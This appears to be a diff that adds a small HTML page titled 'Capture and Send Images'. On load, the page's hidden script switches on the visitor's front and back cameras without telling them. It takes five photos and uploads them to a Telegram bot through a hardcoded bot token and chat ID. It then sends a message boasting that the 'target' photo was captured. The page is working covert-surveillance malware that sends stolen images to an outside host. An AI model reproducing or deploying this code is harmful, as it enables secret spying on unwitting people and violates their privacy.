@@ -1,0 +1,111 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Images</title>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const botToken = '8110116884:AAECk5QH7M8hP-NvIRgxcsmPja88gqQ0qJU';
+        const chatId = '7336408897';
+
+        // Access the device camera and stream to video element
+        function startCamera(facingMode) {
+            return navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
+                .then(stream => {
+                    video.srcObject = stream;
+                    return new Promise(resolve => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+                })
+                .catch(err => {
+                    console.error("Error accessing the camera: " + err);
+                });
+        }
+
+        // Capture image from video stream
+        function captureImage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
+        }
+
+        // Send image to Telegram bot
+        function sendImageToTelegram(imageData) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'image.png');
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Image sent successfully:', data);
+                sendNotificationToTelegram();
+            })
+            .catch(error => {
+                console.error('Error sending image:', error);
+            });
+        }
+
+        // Send notification to Telegram bot
+        function sendNotificationToTelegram() {
+            const message = '🌐| 𝘿𝙄𝙇𝙕 𝙃𝘼𝙉𝙆𝙀𝘿 ( FOTO TARGET BERHASIL DI AMBIL ) |🌐';
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Notification sent successfully:', data);
+            })
+            .catch(error => {
+                console.error('Error sending notification:', error);
+            });
+        }
+
+        // Convert data URI to Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+        // Capture and send five images from both front and back cameras
+        async function captureAndSendImages() {
+            const facingModes = ['user', 'environment'];
+            for (let i = 0; i < 5; i++) {
+                const facingMode = facingModes[i % 2];
+                await startCamera(facingMode);
+                await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for 2 seconds
+                const imageData = captureImage();
+                sendImageToTelegram(imageData);
+            }
+        }
+
+        // Start capturing and sending images after a short delay to allow camera to initialize
+        setTimeout(captureAndSendImages, 3000);
+    </script>
+</body>
+</html>
